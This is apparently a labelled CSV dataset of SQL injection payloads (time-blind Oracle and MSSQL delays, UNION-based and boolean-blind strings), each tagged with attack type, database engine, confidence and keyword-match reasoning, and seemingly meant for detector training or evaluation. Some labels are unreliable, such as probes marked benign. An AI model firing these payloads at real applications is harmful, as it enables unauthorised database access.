id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1814,"1"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1828,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'hzav' = 'hzav",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1887,"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1928,"1' ) ) as tfub where 3461 = 3461 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1993,"1 ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1802,-7426' order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
1830,"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2
1844,"iif ( 8354 = 3515,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
1889,waitfor delay '0:0:5' and ( ( 7619 = 7619,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1801,-9358' or 9887 = 2569--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
1803,-9264' ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
1806,1' ) ) ) and 7533 = 7533 and ( ( ( 'suzd' like 'suzd,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
1807,"-6626%"" ) or 1744 = 5292 and ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
1809,"1' ) as hats where 2011 = 2011 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
1810,1' ) ) ) and 3602 = 1990#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
1815,"-4960 union all select 4031,4031#",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
1816,"1"" where 1719 = 1719 and 7533 = 7533--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
1820,-3496' ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
1821,1%' ) ) ) and 3916 = 6327--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
1823,"-1376%"" ) ) ) or 3458 = 9503 and ( ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 46 chars.,2
1824,1 ) where 8232 = 8232 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
1825,"1"" ) where 6018 = 6018 and 7533 = 7533--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
1827,1' union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 25 chars.,2
1831,"-3819' ) ) ) union all select 9014,9014,9014,9014,9014,9014--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
1835,"-2276"" ) ) as qwow where 2321 = 2321 or 3534 = 2971--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
